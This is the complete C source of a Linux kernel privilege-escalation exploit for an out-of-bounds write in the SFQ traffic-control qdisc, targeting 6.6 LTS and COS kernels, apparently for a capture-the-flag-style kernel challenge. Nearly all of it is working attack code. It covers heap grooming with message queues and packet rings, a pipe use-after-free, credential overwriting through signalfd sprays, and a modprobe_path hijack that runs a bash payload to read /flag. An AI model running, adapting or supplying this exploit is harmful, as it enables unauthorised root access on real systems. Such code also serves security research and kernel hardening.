/*
 *    SFQ Array-Out-Of-Bounds exploit (LST 6.6.*, COS 105, COS 109)
 *      - D3vil (savy@syst3mfailure.io)
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sched.h>
#include <fcntl.h>
#include <string.h>
#include <byteswap.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <signal.h>
#include <sys/signalfd.h>
#include <sys/resource.h>

#include "netlink_utils.h"

#define PAGE_SIZE 0x1000
#define PAGE_ORDER2SIZE(n) (PAGE_SIZE << n)

// Sandbox
#define UID_MAP   "/proc/self/uid_map"
#define GID_MAP   "/proc/self/gid_map"
#define SETGROUPS "/proc/self/setgroups"

// Network interfaces
#define ADD_LINK  RTM_NEWLINK
#define DEL_LINK  RTM_DELLINK
#define NO_PRIO 0

// Traffic control
#define ADD_QDISC RTM_NEWQDISC
#define DEL_QDISC RTM_DELQDISC
#define ADD_CLASS RTM_NEWTCLASS
#define DEL_CLASS RTM_DELTCLASS
#define SHOW_CLASS RTM_GETTCLASS

#define TC_H(x, y) (x << 16 | y)

// Packet rings
#define PACKET_TX_RING 13
#define PACKET_VERSION 10
#define TPACKET_V1 0

// Modprobe
#define MODPROBE_MIN_PID  150 // PID is always >180
#define MODPROBE_MAX_PID 5000
#define MODPROBE_PATH "/proc/sys/kernel/modprobe"
#define MODPROBE_JUNK_DATA "\xdd\xdd\xdd\xdd\xdd\xdd\xdd"
#define MODPROBE_PAYLOAD \
    "#!/bin/bash\n" \
    "pid=$(echo \"$0\" | sed -E 's|/proc/([0-9]+)/.*|\\1|')\n" \
    "cat /flag > /proc/$pid/fd/696\n"

// Exploitation
#define MAX_RETRIES 3

#define FILE_CRED_OFFSET_LTS 0x70
#define FILE_CRED_OFFSET_COS 0x90
#define FILE_PRIVATE_DATA_OFFSET 0xc8

#define KMALLOC_2K_PARTIALS 0x800
#define KMALLOC_192_CG_PARTIALS 0x1000
#define KMALLOC_96_CG_PARTIALS 0x1800

#define NUM_SIGNALFD_FILES 0xa00
#define NUM_FILES 0x800
#define NUM_FIFO 0x540

#define NUM_DUMMY_NET_IF 0x2000
#define NUM_PREALLOC_SFQ 0x1000
#define NUM_MSG_QUEUES (KMALLOC_2K_PARTIALS + KMALLOC_192_CG_PARTIALS + KMALLOC_96_CG_PARTIALS)
#define SFQ_ALLOC_RATIO 3
#define NUM_256KB_BLOCKS 12
#define NUM_KMALLOC_2K_OBJECTS 128
#define VULN_OBJ_ALLOCATION_IDX ((NUM_256KB_BLOCKS / SFQ_ALLOC_RATIO) * NUM_KMALLOC_2K_OBJECTS / 2)

// Task fun
#define TASK_GROUP_SIZE (NUM_256KB_BLOCKS - ((NUM_256KB_BLOCKS - 1) / SFQ_ALLOC_RATIO + 1))
#define TASK_STACK_SIZE 0x40000
#define TASK_BUSY_WAIT_SLEEP_US 20000
#define for_each_task(task_group, tsk) \
    for (int i = 0; i < TASK_GROUP_SIZE; i++) \
        if (tsk = task_group[i])


struct umsg {
    long mtype;
    char mtext[];
};

struct list_head {
    struct list_head *next, *prev;
};

struct msg_msg {
    struct list_head m_list;
    long int m_type;
    size_t m_ts;
    void *next;
    void *security;
};

struct msg_seg {
    struct msg_seg *seg;
};

enum task_cmd {
    TASK_OPEN_FIFO = 1,
    TASK_REOPEN_FIFO,
    TASK_CAUSE_UAF,
    TASK_ALLOC_SIGNALFD,
    TASK_FREE_SIGNALFD,
    TASK_FIND_FIFO,
    TASK_GET_ROOT,
    TASK_TERMINATE,
};

struct shmem {
    int cmd;
    int done;
    int found;
    int sleeping;
};

struct task {
    pid_t pid;
    struct shmem *shm;
};

// Due to the limited number of open files (ulimit -Hn is 4096)
// we need to orchestrate multiple tasks to spray named pipes and signalfd
// The tasks are organized into two different groups, each with a specific function
struct task_groups {
    // Tasks in group 1 do the actual job: they spray fifo,
    // look for the corrupted named pipe, and gain root privileges  
    struct task *group_1[TASK_GROUP_SIZE];
    // Tasks in group 2 are only used to allocate/free signalfd
    struct task *group_2[TASK_GROUP_SIZE];
};

struct tc_handle {
    char *name;
    void (*func)(struct nlmsghdr *msg, int cmd, void *opt);
};

struct tbf_custom_opt {
    uint32_t burst;
    uint64_t rate64;
    uint16_t overhead;
};

void tc_handle_tbf(struct nlmsghdr *msg, int cmd, void *opt);
void tc_handle_sfq(struct nlmsghdr *msg, int cmd, void *opt);

struct tc_handle tc_handlers[] = {
    { "tbf",  tc_handle_tbf  },
    { "sfq",  tc_handle_sfq  },
};

int assign_to_core(int core_id) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);
    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
        perror("[x] sched_setaffinity()");
        return -1;
    }
    return 0;
}

int write_file(char *path, char *data, size_t size) {
    int fd = open(path, O_WRONLY | O_CREAT, 0777);
    if (fd < 0)
        return -1;
    if (write(fd, data, size) < 0) {
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

// Sandbox utils
int new_map(char *path, int in, int out) {
    char buff[0x40] = { 0 };
    snprintf(buff, sizeof(buff), "%d %d 1", in, out);
    if (write_file(path, buff, strlen(buff)) < 0) {
        perror("[x] new_map() - write()");
        return -1;
    }
    return 0;
}

void ulimit_max(void) {
    struct rlimit limit;
    if (getrlimit(RLIMIT_NOFILE, &limit) < 0) {
        perror("[x] getrlimit()");
        return;
    }
    limit.rlim_cur = limit.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &limit) < 0) {
        perror("[x] setrlimit()");
        return;
    }
}

int setup_sandbox(void) {
    int uid = getuid();
    int gid = getgid();
    if (unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET) < 0) {
        perror("unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET)");
        return -1;
    }
    write_file(SETGROUPS, "deny", strlen("deny"));
    new_map(UID_MAP, 0, uid);
    new_map(GID_MAP, 0, gid);
    ulimit_max();
    return 0;
}

// Modprobe utils
void setup_modprobe(void) {
    write_file("/tmp/trigger", MODPROBE_JUNK_DATA, strlen(MODPROBE_JUNK_DATA));
    write_file("/tmp/evil", MODPROBE_PAYLOAD, strlen(MODPROBE_PAYLOAD));
}

int modeprobe_exec(void) {
    struct stat st;
    char flag[0x1000] = { 0 };
    char evil_path[0x100] = { 0 };

    for (int pid = MODPROBE_MIN_PID; pid < MODPROBE_MAX_PID; pid++) {
        snprintf(evil_path, sizeof(evil_path), "/proc/%d/root/tmp/evil", pid);
        write_file(MODPROBE_PATH, evil_path, strlen(evil_path));

        execve("/tmp/trigger", NULL, NULL);
        fstat(696, &st);

        if (st.st_size > 0) {
            puts("pwned");
            read(696, flag, st.st_size);
            printf("%s\n", flag);
            sleep(1);
            exit(0);
        }
    }
    return 0;
}

int packet_tx_set_ring(uint32_t size, uint32_t n) {
    int s = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    int version = TPACKET_V1;

    if (setsockopt(s, SOL_PACKET, PACKET_VERSION, &version, sizeof(int)) < 0) {
        perror("[x] setsockopt(PACKET_VERSION)");
        return -1;
    }

    struct tpacket_req req = {
        .tp_block_size = size,
        .tp_frame_size = PAGE_SIZE,
        .tp_block_nr = n,
    };

    req.tp_frame_nr = (size * req.tp_block_nr) / req.tp_frame_size;

    if (setsockopt(s, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0) {
        perror("[x] setsockopt(PACKET_TX_RING)");
        return -1;
    }
    return s;
}

int alloc_pages(uint32_t order, uint32_t n_pages) {
    return packet_tx_set_ring(PAGE_ORDER2SIZE(order), n_pages);
}

int init_mqueue(void) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qid < 0) {
        perror("[x] msgget()");
        return -1;
    }
    return qid;
}

int close_queue(int qid) {
    return msgctl(qid, IPC_RMID, NULL);
}

int send_msg(int qid, char *buff, size_t size) {
    if (size <= sizeof(struct msg_msg))
        return -1;

    size_t msize = size - sizeof(struct msg_msg);
    if (msize > (PAGE_SIZE - sizeof(struct msg_msg)))
        msize = msize - ((msize / PAGE_SIZE) * sizeof(struct msg_seg));

    struct umsg *msg = calloc(1, sizeof(struct umsg) + msize);
    msg->mtype = 1;

    if (buff)
        memcpy(msg->mtext, buff, msize);

    if (msgsnd(qid, msg, msize, 0) < 0) {
        perror("[x] msgsnd()");
        free(msg);
        return -1;
    }
    free(msg);
    return 0;
}

int create_fifo(char *path) {
    if (mkfifo(path, O_RDWR) < 0 ) {
        perror("[x] mkfifo()");
        return -1;
    }
    return 0;
}

int open_fifo(char *path) {
    int fd = open(path, O_RDWR | O_NONBLOCK);
    if (fd < 0) {
        perror("[x] open(fifo)");
        return -1;
    }
    return fd;
}

int alloc_signalfd(int sfd) {
    uint64_t mask = -1;
    int fd = signalfd(sfd, (sigset_t *)&mask, 0);
    if (fd < 0) {
        perror("[x] signalfd");
        return -1;
    }
    return fd;
}

int net_if(int cmd, char *type, int num, int flags, int change) {
    struct nlmsghdr *msg;
    struct ifinfomsg ifinfo = {};
    char name[0x100] = { 0 };

    strcpy(name, type);

    if (num >= 0)
        snprintf(name, sizeof(name), "%s-%d", type, num);

    int sk = nl_init_request(cmd, &msg, NLM_F_REQUEST|NLM_F_CREATE);
    if (sk < 0) {
        perror("net_if() - nl_init_request()");
        return -1;
    }

    ifinfo.ifi_family = AF_UNSPEC;
    ifinfo.ifi_type = PF_NETROM;
    ifinfo.ifi_index = (cmd == DEL_LINK) ? if_nametoindex(name) : 0;
    ifinfo.ifi_flags = flags;
    ifinfo.ifi_change = change ? 1 : 0;

    nlmsg_append(msg, &ifinfo, sizeof(ifinfo), NLMSG_ALIGNTO);

    if (cmd == ADD_LINK) {
        struct nlmsghdr *options = nlmsg_alloc();
        nla_put_u32(msg, IFLA_MTU, 65535);
        nla_put_string(msg, IFLA_IFNAME, name);
        nla_put_string(options, IFLA_INFO_KIND, type);
        nla_put_nested(msg, IFLA_LINKINFO, options);
        nlmsg_free(options);
    }

    return nl_complete_request(sk, msg);
}

int tc_init_request(struct nlmsghdr **msg, int cmd, char *name, char *net_if, int handle, int parent, int change) {
    struct tcmsg tchdr = {};
    int flags = NLM_F_REQUEST;
    
    if (cmd == SHOW_CLASS)
        flags |= NLM_F_DUMP;
    else if (!change)
        flags |= NLM_F_CREATE;

    int sk = nl_init_request(cmd, msg, flags);
    if (sk < 0) {
        perror("tc_prepare_msg() - nl_init_request()");
        return -1;
    }

    tchdr.tcm_family  = AF_UNSPEC;
    tchdr.tcm_ifindex = if_nametoindex(net_if);
    tchdr.tcm_handle  = handle;
    tchdr.tcm_parent  = parent;
    tchdr.tcm_info    = 0;

    nlmsg_append(*msg, &tchdr, sizeof(struct tcmsg), NLMSG_ALIGNTO);
    nla_put_string(*msg, TCA_KIND, name);

    return sk;
}

int tc_complete_request(int sk, struct nlmsghdr *msg) {
    return nl_complete_request(sk, msg);
}

void tc_handle_tbf(struct nlmsghdr *msg, int cmd, void *opt) {
    if (cmd == ADD_QDISC) {
        struct nlmsghdr *options = nlmsg_alloc();
        struct tc_tbf_qopt qopt = { .limit = 10000 };
        uint32_t burst  = 100000;
        uint64_t rate64 = 100000;

        if (opt) {
            struct tbf_custom_opt *custom = (struct tbf_custom_opt *)opt;
            burst = custom->burst;
            rate64 = custom->rate64;
            qopt.rate.overhead = custom->overhead;
        }

        nla_put(options, TCA_TBF_PARMS, sizeof(qopt), &qopt);
        nla_put_u32(options, TCA_TBF_BURST, burst);
        nla_put_u64(options, TCA_TBF_RATE64, rate64);
        nla_put_nested(msg, TCA_OPTIONS, options);
        nlmsg_free(options);
    }
}

void tc_handle_sfq(struct nlmsghdr *msg, int cmd, void *opt) {
    if (cmd == ADD_QDISC) {
        struct tc_sfq_qopt_v1 qops = {
            .v0.limit = 2,
            .v0.flows = 1,
            .depth = 1,
        };
        nla_put(msg, TCA_OPTIONS, sizeof(qops), &qops);
    }
}

int tc(int cmd, char *name, char *net_if, int handle, int parent, void *opt, int change) {
    struct nlmsghdr *msg;

    int sk = tc_init_request(&msg, cmd, name, net_if, handle, parent, change);
    if (sk < 0)
        return -1;

    for (int i = 0; i < sizeof(tc_handlers) / sizeof(tc_handlers[0]); i++) {
        if (!strcmp(name, tc_handlers[i].name)) {
            tc_handlers[i].func(msg, cmd, opt);
            break;
        }
    }

    // Send the message and deallocate resources
    return tc_complete_request(sk, msg);
}

int send_packets(uint8_t *if_name, size_t pkt_size, uint64_t pkt_num, int prio) {
    struct sockaddr_in dst = {};
    struct ifreq ifr = {};

    char *pkt = calloc(1, pkt_size);
    if (!pkt) {
        return -1;
    }

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("[x] socket(SOCK_RAW)");
        free(pkt);
        return -1;
    }

    strncpy(ifr.ifr_name, if_name, IFNAMSIZ);

    if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, ifr.ifr_name, IFNAMSIZ) < 0) {
        perror("[x] setsockopt(SO_BINDTODEVICE)");
        free(pkt);
        close(s);
        return -1;
    }

    if (prio > 0) {
        if (setsockopt(s, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio)) < 0) {
            perror("[x] setsockopt(SO_PRIORITY)");
            free(pkt);
            close(s);
            return -1;
        }
    }

    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = 0xdeadbeef;

    for (uint64_t i = 0; i < pkt_num; i++) {
        memset(pkt, i, pkt_size);
        if (sendto(s, pkt, pkt_size, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            perror("[x] sendto()");
            free(pkt);
            close(s);
            return -1;
        }
    }

    free(pkt);
    close(s);
    return 0;
}

struct task *task_create(int (*func)(void *)) {
    void *stack = calloc(1, TASK_STACK_SIZE);
    struct task *tsk = calloc(1, sizeof(struct task));
    if (!stack || !tsk) {
        return NULL;
    }

    struct shmem *shm = (struct shmem *)mmap(NULL, sizeof(struct shmem),
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (shm == MAP_FAILED) {
        perror("task_create()");
        return NULL;
    }

    pid_t pid = clone(func, stack + TASK_STACK_SIZE,
            CLONE_CHILD_SETTID|CLONE_CHILD_CLEARTID|SIGCHLD, (void *)shm);

    shm->cmd = 0;
    shm->found = 0;
    shm->sleeping = 0;

    tsk->pid = pid;
    tsk->shm = shm;

    return tsk;
}

void task_ctl(struct task *tsk, int cmd) {
    if (!tsk->shm->sleeping) {
        tsk->shm->cmd = cmd;
        while (!tsk->shm->done) {  usleep(TASK_BUSY_WAIT_SLEEP_US); }
        tsk->shm->done = 0;
    }
}

void task_cmd_wait(struct shmem *shm, int cmd) {
    assign_to_core(1);
    while (shm->cmd != cmd) {  usleep(TASK_BUSY_WAIT_SLEEP_US); }
    assign_to_core(0);
}

void task_cmd_done(struct shmem *shm) {
    shm->done = 1;
}

void task_terminate(struct task *tsk) {
    tsk->shm->cmd = TASK_TERMINATE;
}

void task_sleep(struct shmem *shm) {
    shm->sleeping = 1;
    sleep(100);
}

int task_spray_signalfd(void *args) {
    int sig_fd[0x1000] = { 0 };

    struct shmem *shm = (struct shmem *)args;

    task_cmd_wait(shm, TASK_ALLOC_SIGNALFD);

    // Populate the free page with signalfd files
    for (int i = 0; i < NUM_SIGNALFD_FILES; i++)
        sig_fd[i] = alloc_signalfd(-1);

    task_cmd_done(shm);
    task_cmd_wait(shm, TASK_FREE_SIGNALFD);

    // Each page contains 16 signalfd files, free ~2 files per page
    for (int i = 0; i < NUM_SIGNALFD_FILES; i++)
        if (i % 8 == 0)
            close(sig_fd[i]);

    task_cmd_done(shm);
    task_cmd_wait(shm, TASK_TERMINATE);
}

int task_fifo_attack(void *args) {
    char old_page[0x1000];
    char buff[0x1000] = { 0 };
    char fifo_path[0x800][100];
    int fifo_fd_A[0x800] = { 0 };
    int fifo_fd_B[0x800] = { 0 };
    int sig_fd[0x1000];
    int evil_fifo = -1;
    uint64_t cred = 0;
    uint64_t cred_offset = 0;
    int pid = getpid();

    struct shmem *shm = (struct shmem *)args;

    // Prepare a memfd, we will receive the flag here
    int m = memfd_create("", 0);
    dup2(m, 696);
    close(m);

    // Prepare named pipes
    for (int i = 0; i < NUM_FIFO; i++) {
        snprintf(fifo_path[i], sizeof(fifo_path[i]), "/tmp/fifo-%d-%d", pid, i);
        create_fifo(fifo_path[i]);
    }

    task_cmd_wait(shm, TASK_OPEN_FIFO);

    // Spray pipe_inode_info
    for (int i = 0; i < NUM_FIFO; i++)
        fifo_fd_A[i] = open_fifo(fifo_path[i]);

    task_cmd_done(shm);
    task_cmd_wait(shm, TASK_REOPEN_FIFO);  // >>> Here the OOB is triggered by main() <<<

    // Now probaby one of the pipes is corrupted, pipe->files is 0 instead of 1

    // Open all named pipes to increment pipe->files
    for (int i = 0; i < NUM_FIFO; i++) {
        fifo_fd_B[i] = open_fifo(fifo_path[i]); // pipe->files++
        write(fifo_fd_B[i], buff, 0x800); // pipe->head -> 1
        read(fifo_fd_B[i], buff, 0x800); // pipe->tail -> 1
    }

    task_cmd_done(shm);
    task_cmd_wait(shm, TASK_CAUSE_UAF);

    // Then close all the pipes to decrement pipe->files
    // Only the corrupted pipe is freed causing a UAF
    // as we still have a reference to it in fifo_fd_A[]
    for (int i = 0; i < NUM_FIFO; i++) {
        close(fifo_fd_B[i]);
        // free_pipe_info() also freed pipe->tmp_page
        // We write to the pipe to set the buffer len to 0x1000 and reuse the freed page
        // We are actually writing to a free page
        write(fifo_fd_A[i], buff, PAGE_SIZE);
    }

    task_cmd_done(shm);
    task_cmd_wait(shm, TASK_FIND_FIFO); // >>> Here task group 2 allocated many signalfd files <<<

    // Read from all fifo until we find something
    // Our original buffer consisted of 0x1000 zeros
    // So if we find a 0xFF, we found the corrutped pipe
    for (int i = 0; i < NUM_FIFO; i++) {
        read(fifo_fd_A[i], buff, PAGE_SIZE);
        if (memchr(buff, 0xFF, PAGE_SIZE) != NULL) {
            evil_fifo = fifo_fd_A[i];
            break;
        }
    }

    if (evil_fifo == -1) {
        task_cmd_done(shm);
        //task_cmd_wait(shm, TASK_TERMINATE);
        task_sleep(shm);
        return -1;
    }

    // Notify main() that we found the corrupted pipe
    shm->found = getpid();

    write(evil_fifo, buff, PAGE_SIZE);
    memcpy(old_page, buff, PAGE_SIZE);

    task_cmd_done(shm);
    task_cmd_wait(shm, TASK_GET_ROOT); // >>> Here group 2 freed some signalfd files, ~2 per slab <<<

    read(evil_fifo, buff, PAGE_SIZE);
    write(evil_fifo, buff, PAGE_SIZE);

    // Now overwrite file->private_data with file->f_cred
    // and write backwards starting from file->f_cred + 48
    // to set the process credentials to zero.
    if (memcmp(old_page, buff, PAGE_SIZE)) {

        printf("identified in task %d\n", getpid());

        // Replace the freed signalfd files
        for (int i = 0; i < NUM_SIGNALFD_FILES; i++)
            sig_fd[i] = alloc_signalfd(-1);

        read(evil_fifo, buff, PAGE_SIZE);

        // Instance fingerprint based on file->f_cred offset
        // On LTS (and mitigation) file->f_cred offset is 0x70
        // On cos 105 0x70 is NULL, file->f_cred offset is 0x90
        uint64_t *page = (uint64_t *)buff;

        uint64_t cred_offset = FILE_CRED_OFFSET_LTS;
        if (!page[FILE_CRED_OFFSET_LTS/sizeof(uint64_t)])
            cred_offset = FILE_CRED_OFFSET_COS;

        // Overwrite cred by writing backwards 
        // Write two null-bytes at a time using the MSBs of signalfd mask
        // starting from cred + 48
        uint64_t num_writes = 48 / sizeof(uint16_t) + 1;
        uint64_t file_chunk_size = 0x100;
        uint64_t num_files_per_page = PAGE_SIZE / file_chunk_size; // 16

        for (int i = 0; i < num_writes; i++) {
            for (int j = 0; j < num_files_per_page; j++) {
                uint64_t file_object_offset = file_chunk_size * j / sizeof(uint64_t);
                uint64_t file_cred_offset = cred_offset / sizeof(uint64_t);
                uint64_t file_private_data_offset = FILE_PRIVATE_DATA_OFFSET / sizeof(uint64_t);

                // file->private_data = file->f_cred
                cred = page[file_object_offset +  file_cred_offset];
                page[file_object_offset + file_private_data_offset] = cred + 48 - i * sizeof(uint16_t);

                // Overwrite the entire page with the malicious one
                write(evil_fifo, buff, PAGE_SIZE);
                // Read the page to reset pipe buffer len to 0 and reuse the same page
                read(evil_fifo, buff, PAGE_SIZE);

                // Arb write
                for (int k = 0; k < NUM_SIGNALFD_FILES; k++)
                    alloc_signalfd(sig_fd[k]);
            }
        }

        puts("r0o0ot");
        
        // All good, now read the flag
        modeprobe_exec();
    }

    task_cmd_done(shm);
    task_cmd_wait(shm, TASK_TERMINATE);
    //task_sleep(shm);
}

void main(int argc, char *argv[]) {
    uint8_t if_name[0x80] = { 0 };
    int mqueues[NUM_MSG_QUEUES] = { 0 };
    int pages[NUM_256KB_BLOCKS] = { 0 };
    int drained_pages[4] = { 0 };
    struct task_groups tasks = {};
    struct task *tsk = NULL;
    int task_num = 0, sfq_num = 0;
    struct tbf_custom_opt tbf_custom_opt = {};
    char retries_str[2] = { 0 };
    int found = 0;
    int retries = argc > 1 ? atoi(argv[1]) : 0;

    // @step(1): Initialization
    setup_modprobe();
    assign_to_core(0);
    setup_sandbox();

    // Setup lo interface and add tbf qdisc
    net_if(ADD_LINK, "lo", -1, IFF_UP, true);

    tbf_custom_opt.burst = 100;
    tbf_custom_opt.rate64 = 80;
    tc(ADD_QDISC, "tbf", "lo", TC_H(1, 0), TC_H_ROOT, &tbf_custom_opt, 0);

    printf("spawning %d tasks per group\n", TASK_GROUP_SIZE);
    for (int i = 0; i < TASK_GROUP_SIZE; i++)
        tasks.group_1[i] = task_create(task_fifo_attack);

    for (int i = 0; i < TASK_GROUP_SIZE; i++)
        tasks.group_2[i] = task_create(task_spray_signalfd);

    sleep(1); // Make sure all the tasks are ready

    for (int i = 0; i < NUM_MSG_QUEUES; i++)
        mqueues[i] = init_mqueue();

    puts("filling partials");

    int qidx = 0;

    // Fill kmalloc-2k partials
    for (int i = 0; i < KMALLOC_2K_PARTIALS; i++)
        for (int j = 0; j < 2; j++)
            send_msg(mqueues[i], NULL, 2048);
    
    qidx += KMALLOC_2K_PARTIALS;

    // Fill kmalloc-cg-192 partials
    for (int i = 0; i < KMALLOC_192_CG_PARTIALS; i++)
        for (int j = 0; j < 3; j++)
            send_msg(mqueues[qidx + i], NULL, 192);

    qidx += KMALLOC_192_CG_PARTIALS;

    // Fill kmalloc-cg-96 partials
    for (int i = 0; i < KMALLOC_96_CG_PARTIALS; i++)
        for (int j = 0; j < 36; j++)
            send_msg(mqueues[qidx + i], NULL, 96);

    puts("net ifs");

    // Init dummy interfaces, used later to spray sfq Qdiscs
    for (int i = 0; i < NUM_DUMMY_NET_IF; i++)
        net_if(ADD_LINK, "dummy", i, 0, false);

    puts("tc");

    // Populate kmalloc-64 with sfq_slot(s) so when skb -> sfq_slot type confusion occurs
    // skb->head in kmalloc-64 corresponds to another sfq_slot in the slab and the kernel is happy
    for (int i = 0; i < NUM_PREALLOC_SFQ; i++) {
        snprintf(if_name, sizeof(if_name), "dummy-%d", i);
        tc(ADD_QDISC, "sfq", if_name, TC_H(1, 0), TC_H_ROOT, NULL, 0);
    }

    // @step(2): Drain pages and create partials
    for (int i = 0; i < 4; i++) {
        uint64_t page_order = i;
        uint64_t num_pages = (page_order < 2) ? 0x8000 : 0x4000;
        drained_pages[i] = alloc_pages(page_order, num_pages);
    }

    // Create many kmalloc-cg-96 partials
    // Useful to mitigate noise due to the pipe_buffer allocation in alloc_pipe_info()
    for (int i = 0; i < KMALLOC_96_CG_PARTIALS; i+= 2)
        close_queue(mqueues[qidx + i]);

    // @step(3): Prepare the memory layout
    for (int i = 0; i < NUM_256KB_BLOCKS; i++) {
        if (i % SFQ_ALLOC_RATIO == 0) {
            // Try to fill 8 order 3 pages with kmalloc-2k slabs (sfq qdisc)
            for (int j = sfq_num; j < sfq_num + NUM_KMALLOC_2K_OBJECTS; j++) {
                snprintf(if_name, sizeof(if_name), "dummy-%d", j + NUM_PREALLOC_SFQ);
                tc(ADD_QDISC, "sfq", if_name, TC_H(1, 0), TC_H_ROOT, NULL, 0);

                // Allocate vuln object
                if (j == VULN_OBJ_ALLOCATION_IDX) {
                    printf("vuln obj alloc idx %d\n", j);
                    tc(ADD_QDISC, "sfq", "lo", TC_H(2, 0), TC_H(1, 0), NULL, 0);
                }
            }
            sfq_num += NUM_KMALLOC_2K_OBJECTS;
        } else {
            // Try to fill 8 order 3 pages with kmalloc-cg-192 slabs (pipe_inode_info)
            task_ctl(tasks.group_1[task_num++], TASK_OPEN_FIFO);
        }
    }

    printf("task num %d\n", task_num);

    // @step(4): Trigger the vulnerability and drop TBF rate to block dequeue
    // Send packets to the lo interface to trigger the bug
    send_packets("lo", 64, 3, NO_PRIO);

    // The malicious packet is still in the queue because tbf ran out of tokens
    // Before it gets dequeued, reconfigure the root qdisc by dropping the rate and adding packet overhead
    // No more packets will be dequeued. This will prevent the kernel from crashing
    tbf_custom_opt.burst = 99;
    tbf_custom_opt.rate64 = 1;
    tbf_custom_opt.overhead = 0xffff;
    tc(ADD_QDISC, "tbf", "lo", TC_H(1, 0), TC_H_ROOT, &tbf_custom_opt, 1);

    puts("waiting for oob");
    sleep(1); // Wait for the malicious packet to be dequeued, tbf latency is ~1s

    // Now 0x0000 (u16) has been written 0x401ec bytes (~256KB) after the vuln sfq Qdisc object
    // The u16 probably corrupted the pipe->files field of a named pipe, setting it zero
    puts("pwning");

    // @step(5): Re-open all named pipes
    // Re-open all fifo and trigger pipe->file++
    // pipe->file of the corrupted pipe is incremented from 0 to 1
    for_each_task(tasks.group_1, tsk)
        task_ctl(tsk, TASK_REOPEN_FIFO);

    puts("triggering uaf");

    // @step(6): Close all named pipes
    // Close all the fifo, trigger pipe->file--
    // pipe->file of the corrupted pipe is decremented from 1 to 0. The corrupted pipe is freed (UAF)
    // The pipe->tmp_page is also freed by free_pipe_info() (page UAF)
    for_each_task(tasks.group_1, tsk)
        task_ctl(tsk, TASK_CAUSE_UAF);

    puts("sigfd");

    // @step(7): Spray signalfd files
    // Reclaim the freed page with signalfd files
    for_each_task(tasks.group_2, tsk)
        task_ctl(tsk, TASK_ALLOC_SIGNALFD);

    puts("checking");

    // @step(8): Locate the corrupted pipe
    // Now inspect all the pages, until we find the corrupted pipe
    for_each_task(tasks.group_1, tsk)
        task_ctl(tsk, TASK_FIND_FIFO);

    // Check if a task actually found something
    for_each_task(tasks.group_1, tsk) {
        if (tsk->shm->found) {
            found = 1;
            break;
        }
    }

    if (!found)
        goto retry;

    puts("found");

    // @step(9): Free some signalfd files
    // Free some of the signalfd files from group 2, ~2 files per slab
    // We will reallocate them in group 1 to avoid IPC later
    for_each_task(tasks.group_2, tsk)
        task_ctl(tsk, TASK_FREE_SIGNALFD);

    sleep(1); // Files RCU

    // @step(10): Get root
    // Reallocate signalfd files
    // Get root privs swapping f->private_data with f->f_cred
    // And read the flag
    for_each_task(tasks.group_1, tsk)
        task_ctl(tsk, TASK_GET_ROOT);

retry:
    if (++retries > MAX_RETRIES)
        return;

    for_each_task(tasks.group_2, tsk)
        task_terminate(tsk);

    for (int i = 0; i < 4; i++)
        close(drained_pages[i]);

    for (int i = 0; i < NUM_MSG_QUEUES; i++)
        close_queue(mqueues[i]);

    printf("retrying (%d/%d)\n", retries, MAX_RETRIES);
    snprintf(retries_str, sizeof(retries_str), "%d", retries);
    char *args[] = { argv[0], retries_str, NULL };
    execv(args[0], args);
}
